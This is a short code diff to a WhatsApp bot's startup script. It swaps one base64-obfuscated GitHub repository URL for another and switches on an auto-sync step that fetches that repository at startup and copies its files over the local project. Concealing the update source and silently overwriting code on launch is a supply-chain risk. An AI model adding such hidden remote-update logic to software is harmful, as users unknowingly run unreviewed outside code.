@@ -3,9 +3,10 @@ import p from "path";
 import c from "./utils/manageConfigs.js";
 import { execSync as eS, spawn as sP } from "child_process";
 
-const _s = (x) => Buffer.from(x, "base64").toString("utf8");
+const _s = (x) =>
+ Buffer.from(x, "base64").toString("utf8");
 
-const R = _s("aHR0cHM6Ly9naXRodWIuY29tL0RhbnNjb3Qvc2Vua3UteG1k"); 
+const R = _s("aHR0cHM6Ly9naXRodWIuY29tL01pY2tleWRldmVsb3Blci9NaWNrZXktWmVuaXRo"); 
 const T = p.join(process.cwd(), _s("LnRlbXBfYm90X3VwZGF0ZQ==")); // ".temp_bot_update"
 const P = c.config?.root?.primary;
 const A = P ? p.join(process.cwd(), "sessions", P, "sessions.json") : null;
@@ -62,12 +63,12 @@ function L() {
 }
 
 (async () => {
-  // Auto sync is disabled by commenting out the sync-related operations
-  console.log("ℹ️  Auto sync is OFF, skipping repository sync...");
-  // S();
-  // console.log("🔁 Copying new files...");
-  // C(T, process.cwd());
-  // f.rmSync(T, { recursive: true, force: true });
+  // Auto sync enabled
+  console.log("ℹ️  Auto sync is ON, syncing repository...");
+  S();
+  console.log("🔁 Copying new files...");
+  C(T, process.cwd());
+  f.rmSync(T, { recursive: true, force: true });
   
   if (!H()) console.log("ℹ️  No Baileys session found, bot will start fresh...");
   
